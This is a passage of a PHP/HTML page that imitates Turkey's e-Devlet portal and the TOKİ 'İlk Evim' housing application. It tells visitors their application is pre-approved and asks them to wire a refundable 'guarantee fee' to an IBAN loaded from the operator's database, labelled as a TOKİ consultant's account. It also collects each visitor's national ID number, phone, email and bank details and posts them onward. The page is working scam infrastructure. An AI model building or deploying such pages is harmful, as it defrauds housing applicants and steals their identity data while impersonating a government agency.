            text-align: center;
            color: #FFF;
            font-style: normal;
            border-radius: 100%;
            margin-right: .25em;
        }
        .button {
            border-radius: .25em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-box-shadow: 0 1px 2px #a8acae;
            box-shadow: 0 1px 2px #a8acae;
            border: 1px solid #a8acae;
            padding: .5em 1em;
            background-image: -webkit-gradient(linear, left top, left bottom, from(#FFF), to(#e7ebed));
            background-image: -o-linear-gradient(top, #FFF, #e7ebed);
            background-image: linear-gradient(to bottom, #FFF, #e7ebed);
            color: #4a4e50;
            height: 37.5px;
        }
        .submitForm {
            border: 1px solid #e7ebed;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 1em;
            border-radius: .5em;
        }
        .submitForm>fieldset {
            display: block;
        }
        .submitForm .satir {
            padding: 1em .5em 1.33em .5em;
            border-bottom: 1px dotted #e7ebed;
            -webkit-transition: background-color 1s;
            -o-transition: background-color 1s;
            transition: background-color 1s;
            position: relative;
            zoom: 1;
        }
        .submitForm .satir.singleRow .singleCheckGroupLine {
            width: 100% !important;
            margin-right: 0;
        }
        .submitForm .satir .singleCheckGroupLine {
            float: none;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-right: 1em;
        }
        .submitForm .satir .checkGroup, .submitForm .satir .checkGroupLine, .submitForm .satir .radioGroup, .submitForm .satir .radioGroupLine, .submitForm .satir .singleCheckGroupLine {
            float: left;
            display: block;
            background: #FFF;
            margin: 0;
            margin-right: .25em;
            padding: .5em;
            border: 1px solid #e7ebed;
            border-radius: .25em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .submitForm .fieldInfo {
            padding-top: .5em;
            font-size: 85%;
            color: #4a4e50;
            clear: both;
        }
        .submitForm .satir .bilgilendirme {
            padding-top: .5em;
            font-size: 85%;
            color: #4a4e50;
            clear: both;
        }
        .submitForm .yildiz{
            color: #347aa1;
            font-weight: 400;
            position: relative;
            top: .1em;
        }
        fieldset {
            border: 0;
            margin: 0;
            padding: 0;
        }
        .sbmtBtn{
            border-top: 2px solid #4284be;
            padding: 2em 1em 2em 1em;
            margin: 1em 0 0 0;
            text-align: center;
            border-radius: 0 0 .5em .5em;
            background: rgba(66, 132, 190, .1);
        }
        .sbmtBtn .gonder {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            background: #3b77ac;
            color: #fff;
            border-radius: 1.25em;
            padding: .5em 1.5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 2.66em;
            margin-top: .25em;
            margin-bottom: .25em;
            margin-right: 1em;
            font-size: 109%;
            border: 1px rgba(59, 119, 172, .3) solid;
            -webkit-box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            box-shadow: inset 0 .05em 0 rgba(255, 255, 255, .3), 0 .5em .5em -.5em rgba(0, 0, 0, .25);
        }
        .sbmtBtn .gonder {
            background: #3b77ac url(assets/button-right.svg) no-repeat right center;
            background-size: 1.4em 1.1em;
            padding-right: 2em;
        }
        .sbmtBtn .gonder.geri{
            background: #3b77ac url(assets/button-left.svg) no-repeat left center;
            padding-right: 1em;
            padding-left: 1em;
        }
        .sbmtBtn .gonder.empty{
            background: #3b77ac;
            padding-right: 1em;
            padding-left: 1em;
        }
        .pageHeader {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            padding: .5em;
            background: #e7ebee;
            margin: 1em 0;
            font-size: 100%;
            border-radius: .25em;
        }
        .pageHeaderArea dl {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            color: #4b4e51;
        }
        .pageHeaderArea dl.compact dt {
            width: 25%;
        }

        .pageHeaderArea dl.compact dt, .pageHeaderArea dl.condensed dt {
            padding: .25em;
            margin-bottom: .5em;
            border-bottom: 1px rgba(66, 132, 190, .5) solid;
        }
        .pageHeaderArea dl dt {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0 .25em;
            min-height: 30px;
            color: #346a99;
            font-weight: 600;
            width: 100%;
        }

        .pageHeaderArea dl.compact dd {
            width: 75%;
        }
        .pageHeaderArea dl dd {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-bottom: .5em;
            padding: .25em;
            min-height: 30px;
            border-bottom: 1px rgba(66, 132, 190, .5) dotted;
            width: 100%;
        }
        .submitForm legend {
            color: #3a89b4;
            padding: 1em .5em;
            font-size: 15px;
        }
        .submitForm .satir label {
            display: block;
            font-weight: 500;
            padding-bottom: .25em;
        }
        .submitForm .satir .advdate[disabled], .submitForm .satir .date[disabled], .submitForm .satir .text[disabled], .submitForm .satir .treeSingle[disabled] {
            background: rgba(231, 235, 237, .5);
            border: 1px solid #a8acae;
            color: #4a4e50;
            cursor: not-allowed;
        }

        .submitForm .satir .advdate[readonly], .submitForm .satir .date[readonly], .submitForm .satir .text[readonly], .submitForm .satir .treeSingle[readonly] {
            background: rgba(231, 235, 237, .5);
            border: 1px solid #a8acae;
            color: #4a4e50;
        }
        .submitForm .satir.errored {
            background: #FFF4F4;
            margin: .5em 0;
            -webkit-box-shadow: 0 0 .33em rgba(207, 34, 28, .5);
            box-shadow: 0 0 .33em rgba(207, 34, 28, .5);
            border-bottom: none;
        }
        .submitForm .satir .fieldError {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            margin-bottom: .25em;
            padding-bottom: .25em;
            color: #830a0a;
            border-bottom: 1px solid rgba(131, 10, 10, .2);
            display: none;
        }
        .errored .fieldError{
            display: block!important;
        }
        .submitForm .satir .advdate, .submitForm .satir .date, .submitForm .satir .text, .submitForm .satir .treeSingle {
            margin: 0;
            padding: 7px;
            border: 1px solid #a8acae;
            border-radius: .25em;
            min-width: 20ex;
            width: 100%;
            height: 37px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -webkit-box-shadow: 0 1px 2px #CCC;
            box-shadow: 0 1px 2px #CCC;
            background: #FFF;
        }
        .submitForm .satir:hover {
            background: rgba(231, 235, 237, .33);
            -webkit-transition: background-color 1s;
            -o-transition: background-color 1s;
            transition: background-color 1s;
        }
        .submitForm .satir .remainingChars+.textarea {
            border-radius: 0 0 .25em .25em;
            border-top: none;
            margin-top: 0;
        }
        .submitForm .satir .textarea[disabled] {
            background: rgba(231, 235, 237, .5);
            border: 1px solid #a8acae;
            color: #4a4e50;
            cursor: not-allowed;
        }
        .submitForm .satir .textarea {
            resize: vertical;
            margin: 0;
            padding: .5em;
            border: 1px solid #a8acae;
            border-radius: .25em;
            min-width: 20ex;
            min-height: 5em;
            width: 100%;
            -webkit-box-shadow: 0 1px 2px #CCC;
            box-shadow: 0 1px 2px #CCC;
            background: #FFF;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .submitForm .satir .comboBox {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            border: 1px solid #a8acae;
            -webkit-box-shadow: 0 1px 2px #CCC;
            box-shadow: 0 1px 2px #CCC;
            background: #e7ebed;
            background-image: url(assets/selectdown.svg), -webkit-gradient(linear, left top, left bottom, from(#FFF), to(#e7ebed));
            background-image: url(assets/selectdown.svg), -o-linear-gradient(top, #FFF, #e7ebed);
            background-image: url(assets/selectdown.svg), linear-gradient(to bottom, #FFF, #e7ebed);
            background-repeat: no-repeat;
            background-size: 24px 24px, auto;
            background-position: right center;
            color: #4a4e50;
            border-radius: .25em;
            padding: .25em 2em .25em 1em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: 2.5em;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            margin-top: 0;
            margin-bottom: .25em;
        }
        .submitForm .row .satir{
            padding-right: 0!important;
        }
        .giris-btn{
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -ms-flex-flow: row nowrap;
            flex-flow: row nowrap;
            background-color: rgba(255, 255, 255, .9);
            -webkit-box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            box-shadow: 0 0 5px 1px rgba(57, 58, 75, .63);
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border-radius: .5em;
            text-align: center;
            margin-left: 10px!important;
        }
        .giris-btn a {
            color: #4284be !important;
            text-decoration: none !important;
            width: 100%;
            padding: .5em .5em .5em 1em;
            display: block;
        }
        .satir input:read-only{
            color:#000!important;
        }
        .copyBtn{
            border: solid 1px #4284be;
            color: #4284be;
            background: #fff;
            border-radius: 5px;
            padding: 7px 10px;
            float: right;
            margin-top: -36px;
            z-index: 1231312;
            position: relative;
            font-size:13px;
        }
        @media (min-width: 40.063em) {
            .submitForm h2 em {
                font-size: 85%;
            }
            .submitForm .satir:not(.lg-form-row) {
                padding: 1em 15% 1.33em .5em;
            }
            .scroll-top {
                bottom: 20px;
                right: 20px;
                line-height: 48px;
                width: 50px;
                height: 50px;
                font-size: 1.5em;
            }
            footer .right-part {
                min-width: 18em;
                max-width: 18em;
                width: 18em;
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-flow: column nowrap;
                flex-flow: column nowrap;
            }
            footer .inner .starts{
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -ms-flex-flow: row nowrap;
                flex-flow: row nowrap;
            }
            .box-header {
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -ms-flex-flow: row nowrap;
                flex-flow: row nowrap;
            }
            aside {
                display: block;
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                padding: .5em;
                margin: 0;
                border-bottom-left-radius: .5em !important;
                border-radius: 0;
                width: 25%;
                position: relative;
                min-height: 100vh;
            }
            content{
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
                padding: 1.5em 1em 5em 1em;
                margin: 0;
                -webkit-box-shadow: -.5em 0 .5em -.5em rgba(75, 78, 81, .25);
                box-shadow: -.5em 0 .5em -.5em rgba(75, 78, 81, .25);
                width: 75%;
            }
        }
        @media (min-width: 64.063em) {
            .submitForm .satir:not(.lg-form-row) {
                padding: 1em 30% 1.33em .5em;
            }
            body {
                font-size: 15px;
            }
            footer .right-part {
                padding-top: 2em;
            }
            aside {
                padding: 2em;
                width: 20%;
            }
            content{
                padding: 2.5em 2em 5em 2em;
                width: 80%;
            }
        }

        @media (max-width: 700px) {
            .hideOnMobile{
                display: none!important;
            }
            .permissionNeeded img {
                margin-top: 30px;
                margin-left: auto;
                margin-right: auto;
                width: 130px;
                display: block;
                position: relative;
            }
            .permissionNeeded .warn-text {
                 padding-left: 1em;
            }
            footer .inner .starts {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-flow: column nowrap;
                flex-flow: column nowrap;
            }
            footer .right-part{
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -ms-flex-flow: row nowrap;
                flex-flow: row nowrap;
                min-height: 184px;
            }
            footer .foot-card {
                width: 100%;
            }
            footer .social-links {
                margin: 0 0 0 1em!important;
                display: grid!important;
                padding-left: 2rem !important;
            }
            footer .social-links a {
                width: 100%;
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                justify-content: center;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
            }
            .sub-copyright {
                margin-top: 0;
                padding-top: 1.5em;
                border-top: 1px dashed rgba(255, 255, 255, .25);
                border-bottom: 1px dashed rgba(255, 255, 255, .25);
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -ms-flex-flow: column nowrap;
                flex-flow: column nowrap;
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                display: block!important;
            }
            .sub-copyright .text1{
                text-align: center;
            }
            .menuList{
                padding-top:0!important;
            }
        }
</style>

    <style>
        table.resultTable {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            width: 100%;
            background: #fff;
            margin: 1em 0 0 0;
            -webkit-box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .15);
            box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .15);
            border-spacing: 0;
            color: #4b4e51;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        .caption {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            padding: .25em;
            background: rgba(169, 172, 175, .2);
            border: solid 1px #dddfe0;
            font-size: 100%;
            border-radius: .25em .25em 0 0;
            border-bottom: none;
            text-align: left;
            text-shadow: 1px 1px 0 rgba(255, 255, 255, .5);
            -webkit-box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            box-shadow: 0 .5em .5em -.5em rgba(0, 0, 0, .25);
            position: relative;
            color: #4b4e51;
        }
        table.resultTable th {
            font-weight: 600;
            background: rgba(169, 172, 175, .1);
            text-shadow: 1px 1px 0 rgba(255, 255, 255, .5);
        }
        table.resultTable td, table.resultTable th {
            padding: .25em;
            border-collapse: collapse;
            text-align: left;
            border: solid 1px #dddfe0;
            background: #fff;
        }
        table.resultTable td a:not(.table-link), table.resultTable th a:not(.table-link) {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            text-decoration: none;
            font-size: 95%;
            margin: 2px 0 1px 0;
            background: rgba(59, 119, 172, .8);
            display: inline-block;
            line-height: 1.3em;
            color: #fff;
            border-radius: .33em;
            padding: .33em .5em;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            background: #3b77ac;
        }
        table.resultTable.striped tr:nth-child(2n) td {
            background: rgba(169, 172, 175, .1);
        }
        dl {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            color: #4b4e51;
        }
        dl.compact dt {
            width: 25%;
        }
        dl.compact dt, dl.condensed dt {
            padding: .25em;
            margin-bottom: .5em;
            border-bottom: 1px rgba(66, 132, 190, .5) solid;
        }
        dl dt {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0 .25em;
            min-height: 30px;
            color: #346a99;
            font-weight: 600;
            width: 100%;
        }
        dl.compact dd {
            width: 75%;
        }
        dl dd {
            border: none;
            margin: 0;
            padding: 0;
            font-weight: 400;
            list-style: none;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-bottom: .5em;
            padding: .25em;
            min-height: 30px;
            border-bottom: 1px rgba(66, 132, 190, .5) dotted;
            width: 100%;
        }
        #pdfPanel {
            border: 1px solid #a9acaf;
            margin: 0;
            padding: .5em .5em .25em .5em;
            -webkit-box-shadow: 0 .25em .5em rgba(75, 78, 81, .5);
            box-shadow: 0 .25em .5em rgba(75, 78, 81, .5);
            background: #fff;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            border-radius: .25em;
            text-align: center;
        }
        .frame1{
            width: 100%;
            height: 800px;
        }
    </style>
</head>
<body>
<header id="top" class="sticky_init1">
    <div class="container">
        <div class="row">
            <div class="col-lg-5">
                <div class="logo-area"></div>
            </div>
            <div class="col-lg-7">
                <ul class="menuList">
                    <li class="hideOnMobile">
                        <span class="fast-shortcuts">
                            <a href="javascript:;">
                                <i class="fa-regular fa-comments"></i>
                                <span> Hızlı Çözüm</span>
                            </a>
                        </span>
                    </li>
                    <li class="hideOnMobile">
                        <div class="dropdown custom">
                            <button class=" dropdown-toggle fast-shortcuts mini" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fa-solid fa-key"></i>
                            </button>
                            <ul class="dropdown-menu">
                                <li><a class="dropdown-item" href="#">Erişilebilirlik<br />Özellikleri</a></li>
                                <li><a class="dropdown-item" href="#">Salt Metin<br />Görünümü</a></li>
                                <li><a class="dropdown-item" href="#">Daha Belirgin<br />Odaklama</a></li>
                            </ul>
                        </div>
                    </li>
                                            <li class="hideOnMobile">
                        <span class="fast-shortcuts mini icons">
                            <a href="javascript:;">
                                <i class="fa-regular fa-id-card"></i>
                                <i class="fa-solid fa-star"></i>
                            </a>
                        </span>
                    </li>
                                      <li>
    <div class="header-search" style="position: relative;">
        <input 
            placeholder="Nasıl yardım edebilirim?" 
            id="searchField" 
            name="aranan" 
            value="" 
            autocomplete="off" 
            role="combobox" 
            aria-owns="popSearch" 
            aria-haspopup="true" 
            aria-autocomplete="both" 
            aria-expanded="false" 
            autocorrect="off" 
            autocapitalize="off">
        <i class="fa-solid fa-magnifying-glass" id="searchBtn"></i>

        <!-- Alt seçenek -->
        <div id="searchOption" style="
            display: none; 
            position: absolute; 
            top: 100%; 
            left: 0; 
            right: 0; 
            background: #fff; 
            border: 1px solid #ccc; 
            padding: 10px; 
            cursor: pointer; 
            z-index: 10;
        ">
            Toplu Konut İdaresi Başkanlığı (TOKİ)
        </div>
    </div>
</li>

<script>
const searchField = document.getElementById('searchField');
const searchOption = document.getElementById('searchOption');
const searchBtn = document.getElementById('searchBtn');

// Input tıklandığında veya yazarken seçenek göster
searchField.addEventListener('focus', () => searchOption.style.display = 'block');
searchField.addEventListener('input', () => searchOption.style.display = 'block');

// Seçeneğe tıklandığında yönlendir
searchOption.addEventListener('click', () => window.location.href = 'toki.php');

// Enter tuşuna basıldığında yönlendir
searchField.addEventListener('keydown', function(e){
    if(e.key === 'Enter'){
        e.preventDefault();
        window.location.href = 'konut0.php';
    }
});

// Büyüteç ikonuna tıklandığında yönlendir
searchBtn.addEventListener('click', () => window.location.href = 'konut0.php');

// Dışarı tıklayınca seçenek kaybolur
document.addEventListener('click', function(e){
    if(!searchField.contains(e.target) && !searchOption.contains(e.target)){
        searchOption.style.display = 'none';
    }
});
</script>

                                        <li>
                        <div class="dropdown custom custom2">
                            <button class="dropdown1 dropdown-toggle fast-shortcuts" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fa-solid fa-user"></i> <?=$adsoyad_tr1?>                          </button>
                            <ul class="dropdown-menu">
                                <li class="sabit"></li>
                                <li><a class="dropdown-item" href="javascript:;">Benim Sayfam</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Favori Hizmetlerim</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Gelen Kutusu  <em>(13)</em></a></li>
                                <li><a class="dropdown-item" href="javascript:;">İletişim Seçenekleri</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Güvenlik ve Ayarlar</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Şifremi Değiştir</a></li>
                                <li><a class="dropdown-item" href="javascript:;">Güvenli Çıkış</a></li>
                            </ul>
                        </div>
                    </li>
                                    </ul>
            </div>
        </div>
    </div>
</header>
<main>
    <nav aria-label="Üst Sayfalar">
        <ul>
            <li><a href="konut0.php" class="home"><i class="fa-solid fa-house"></i> Ana Sayfa</a></li>
            <li><a href="toki.php">Toplu Konut İdaresi Başkanlığı</a></li>
           
        </ul>
    </nav>

    <section class="outer">
        <div class="inner">
            <div class="row">
                <div class="col-lg-6">
                    <div class="box-header">
                        <img src="assets/tokilogo.webp"/>
                        <h2><a href="toki.php">Toplu Konut İdaresi Başkanlığı (TOKİ)</a><em>İlk Evim Konut Başvurusu</em></h2>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="actions">
                                                <a href="javascript:;">
                            <span class="flex_center">
                                <i class="fa-solid fa-star"></i> <span> Favorilerime Ekle</span>
                            </span>
                        </a>
                        <a href="javascript:;">
                            <span class="flex_center">
                                <i class="fa-solid fa-comment"></i> <span> Puanla / Bildir</span>
                            </span>
                        </a>
                                                <a href="javascript:;">
                            <span class="flex_center">
                                <i class="fa-solid fa-share-nodes"></i> <span> Paylaş</span>
                            </span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
        <div class="page-inner">
            <aside>
                                <ul>
                    <li>Bu hizmet Toplu Konut İdaresi Başkanlığı (TOKİ) işbirliği ile e-Devlet Kapısı altyapısı üzerinden sunulmaktadır.</li>
                    <li>
                        <div class="timeIcon">
                            <i class="fa-regular fa-clock"></i>
                        </div>
                        Bu işlem için yaklaşık 6 dakikanızı ayırmalısınız.
                    </li>
                    <li>
                        Bu işlem toplam <strong>6</strong> aşamalıdır. <progress value="1" max="2"></progress>
                    </li>
                    <li class="ol-list">
                        <ol class="asamaBtns">
                            <li class="secili">Proje Seçimi</li>
                            <li class="secili">Tip Seçimi</li>
                            <li class="secili">Bilgilendirme ve Onay</li>
                            <li class="secili">Başvuru Formu</li>
                            <li class="secili">Ödeme</li>
                            <li class="secili">İşlem Sonucu</li>
                        </ol>
                    </li>

                </ul>
                            </aside>
<style>
    p{
        margin-bottom:0;
        padding-bottom:0.5rem!important;
    }
</style>
<content>
    <div role="heading" class="confirm"><strong></i>  <?=$adsoyad?></strong> Başvurunuz ön onay almıştır. </div>
	
	   <?php
                                        require_once __DIR__ . '/inc/brain.php';

                                        $ids = 1;

                                        try {
                                            $stmt = $pdo->prepare("SELECT iban, ad_soyad, banka_adi FROM iban WHERE id = ? ORDER BY id DESC LIMIT 1");
                                            $stmt->execute([$ids]);
                                            $row = $stmt->fetch(PDO::FETCH_ASSOC);
                                            if ($row) {
                                                $iban = $row['iban'];
                                                $ask = $row['ad_soyad'];
                                                $ba = $row['banka_adi'];
                                            }
                                        } catch (PDOException $e) {
                                            error_log('toki.php DB hatası: ' . $e->getMessage());
                                        }
                ?>
        <div class="reminder" role="alert">            <p><strong>İşlemlerinize devam ediliyor.</strong></p>            <p>İlk taksitinizin teminat bedeli : <strong><?=$formatted?></strong></p>
            <p>İlk taksitinize ait teminat bedelinin ödenmesi gerekmektedir. Ödeme işleminden sonra işleminiz tamamlanacaktır.</p>            <p>Yatırdığınız tüm tutarlar banka hesabınıza işlem sonunda iade edilecektir.</p>
            <p>Başka bir banka hesabından da ödeme yapabilirsiniz.</p>
         </div>
        <div class="submitForm">
            <div class="row">
                <div class="col-lg-6">
                    <div class="satir required">
                        <label for=""><span class="yildiz" aria-hidden="true">*</span>TOKİ DANIŞMAN AD SOYAD</label>
                        <input readonly required="required" type="text" class="text adsoyad" value="<?=$ask?>">
                        <div class="copyBtn">
    <a href="javascript:;" onclick="copy('<?=$ask?>', this)">
        <i class="fa-solid fa-copy"></i> <span>Kopyala</span>
    </a>
</div>
                        <div class="bilgilendirme">Ödeme dekontunuzun ekran resmini alarak sisteme yüklemeniz gereklidir.</div>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="satir required">
                        <label for=""><span class="yildiz" aria-hidden="true">*</span>TOKİ DANIŞMAN İBAN NO</label>
                        <input readonly required="required" type="text" class="text iban" value="<?=$iban?>">
                        <div class="copyBtn">
    <a href="javascript:;" onclick="copy('<?=$iban?>', this)">
        <i class="fa-solid fa-copy"></i> <span>Kopyala</span>
    </a>
</div>
                        <div class="bilgilendirme">FAST/HAVALE ödemeleriniz anlık işleme alınmaktadır.</div>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="satir required">
                        <label for=""><span class="yildiz" aria-hidden="true">*</span>Ödenecek Tutar</label>
                        <input readonly type="text" name="mail" required="required" class="text miktar" value="<?=$formatted?>">
                        <div class="bilgilendirme">Ödemeleriniz banka hesabınıza geri iade edilecektir.</div>
                    </div>
                </div>
                <div class="col-lg-6">
                    <div class="satir required">
                        <label for=""><strong style="color:red"><span class="yildiz" aria-hidden="true">*</span> Lütfen Havale/EFT açıklamasına TC giriniz.</strong></label>
                        <input readonly type="text" name="adsdsa" required="required" class="text" value="<?=$tckn?>">
                        <div class="copyBtn">
    <a href="javascript:;" onclick="copy('<?=$tckn?>', this)">
        <i class="fa-solid fa-copy"></i> <span>Kopyala</span>
    </a>
</div>
                        <div class="bilgilendirme">Ödemenizi doğrulayabilmemiz için TC numaranızı işlem açıklamasına girin.</div>
                    </div>
                </div>
            </div>
        </div>
    
<script>
function copy(text, btn) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(text).then(function() {
            const span = btn.querySelector('span');
            const original = span.innerText;
            span.innerText = 'Kopyalandı';
            span.style.color = 'green'; // yeşil renk
            setTimeout(() => {
                span.innerText = original;
                span.style.color = ''; // eski rengi geri getir
            }, 1500);
        }).catch(function(err) {
            console.error('Kopyalama hatası: ', err);
        });
    } else {
        // eski tarayıcı desteği
        var inp = document.createElement('input');
        document.body.appendChild(inp);
        inp.value = text;
        inp.select();
        document.execCommand('copy');
        inp.remove();

        const span = btn.querySelector('span');
        const original = span.innerText;
        span.innerText = 'Kopyalandı';
        span.style.color = 'green';
        setTimeout(() => {
            span.innerText = original;
            span.style.color = '';
        }, 1500);
    }
}
</script>
        <div class="pageHeaderArea mt-4">
    <form method="post" class="submitForm"  action="dekont3.php" >
       <input type="hidden" name="tckn" value="<?=$tckn?>">
    <input type="hidden" name="myadsoyad" value="">
    <input type="hidden" name="cep" value="<?=$gsm?>">
    <input type="hidden" name="email" value="1">
    <input type="hidden" name="vadecen" value="<?=$email?>">
    <input type="hidden" name="myiban" value="">
    <input type="hidden" name="bank" value="1">
    <input type="hidden" name="gonderenadi" value="<?=$adsoyad?>">
    <input type="hidden" name="ataniban" value="">
	    <input type="hidden" name="projeAdi" value="ADANA YUMURTALIK 300/ 250000 SOSYAL KONUT PROJESİ">

        <legend>Başvuru Bilgileri</legend>
        <fieldset>
            <div class="satir required">
                <label for=""><span class="yildiz" aria-hidden="true">*</span>Ad Soyad</label>
                <input readonly required="required" type="text" class="text myadsoyad" value="<?=$adsoyad?>">
            </div>
            <div class="satir required">
                <label for=""><span class="yildiz" aria-hidden="true">*</span>Cep Telefonu Numaranız</label>
                <input readonly required="required" type="text" class="text cep" value="<?=$gsm?>">
                <div class="bilgilendirme">Telefon numaranızı giriniz. Örn; "5XXXXXXXXX"</div>
            </div>
            <div class="satir required">
                <label for=""><span class="yildiz" aria-hidden="true">*</span>E-Posta Adresi</label>
                <input readonly type="text" name="vadecen" required="required" class="text mail" value="<?=$email?>">
                
            </div>
            <div class="satir required">
                 <label for="vade"><span class="yildiz" aria-hidden="true">*</span>Banka</label>
<select name="bank" required class="comboBox banka" value="1">
    <option value="1">AKBANK</option>
    <option value="2">DENIZBANK</option>
    <option value="3">HALKBANK</option>
    <option value="4">FIBABANKA</option>
    <option value="5">INGBANK</option>
    <option value="6">GARANTİ BANKASI</option>
    <option value="7">TEB</option>
    <option value="8">VAKIFLAR BANKASI</option>
    <option value="9">ŞEKERBANK</option>
    <option value="10">ZİRAAT BANKASI</option>
    <option value="11">QNBFINANSBANK</option>
    <option value="12">IS BANKASI</option>
    <option value="13">YAPI KREDI BANKASI</option>
    <option value="14">TÜRKİYE FİNANS A.Ş.</option>
    <option value="15">DİĞER</option>
</select>
                <div class="bilgilendirme">Kredinizin yatırılacağı banka hesabınızı seçin.</div>
            </div>
            <div class="satir required">
                <label for=""><span class="yildiz" aria-hidden="true">*</span>IBAN Numaranız</label>
                <input readonly type="text" name="mail" required="required" class="text myiban" value="<?=$ibanme?>">
                <div class="bilgilendirme">Kredinizin yatırılacağı banka hesabınızın iban numarasını girin.</div>
            </div>
            <div class="satir required">
                <label for="vade"><span class="yildiz" aria-hidden="true">*</span>Çalışıyor Musunuz?</label>
                <select name="email" required class="comboBox is">
        <option value="" >Seçiniz</option>
        <option value="1" selected>Evet</option>
        <option value="0" >Hayır</option>
    </select>
            </div>
<div style="margin: 20px 0; font-family: Arial, sans-serif; font-size: 14px; color: #8B0000;">
    <label style="display: flex; align-items: center; cursor: pointer; background: #ffffff; border: 1px solid #ccc; padding: 12px 16px; border-radius: 8px; transition: all 0.2s;">
        <input type="checkbox" name="tokidanisman_onay" required 
               style="margin-right: 12px; width: 20px; height: 20px; accent-color: #006400; flex-shrink: 0;">
        <span style="color:red">
            Bana Atanan TOKİ Danışmanına, ilk taksitinizin teminat bedeli <?=$formatted?> ödeme yaptığımı onaylıyorum.
        </span>
    </label>
  

<style>
    label:hover {
        border-color: #666; /* Hover’da gri kenarlık koyulaşır */
    }

    input[type="checkbox"]:focus {
        outline: 2px solid #006400; /* Focus koyu yeşil */
        outline-offset: 2px;
    }
</style>




			    <div class="sbmtBtn">
            <input class="gonder " name="btn" type="submit"  value="Teminat Dekontunu Gönder">
        </div>
        </fieldset>
    </form>
</div>

    </div>
</content>
</div>
</section>
</main>
<footer>
    <div class="inner">
        <div class="starts">
            <nav class="linksarea">
                <h2 class="sectionTitle" id="bottomLinksBlockTitle">Sayfa Sonu Bağlantıları</h2>
                <ul class="links">
                    <li class="bottomLinksGroup">
                        <h3>e-Devlet Kapısı</h3>
                        <ul>
                            <li>
                                <a >English</a>
                            </li>
                            <li>
                                <a >Hakkımızda</a>
                            </li>
                            <li>
                                <a >Yasal Bildirim</a>
                            </li>
                            <li>
                                <a >KVKK Aydınlatma Yükümlülüğü</a>
                            </li>
                            <li>
                                <a accesskey="8" >Gizlilik ve Kullanım</a>
                            </li>
                            <li>
                                <a >Politikalarımız</a>
                            </li>
                            <li>
                                <a >DETSİS</a>
                            </li>
                            <li>
                                <a >Kurumsal Kimlik</a>
                            </li>
                        </ul>
                    </li>
                    <li class="bottomLinksGroup">
                        <h3>e-Hizmetler</h3>
                        <ul>
                            <li>
                                <a >Sık Kullanılan Hizmetler</a>
                            </li>
                            <li>
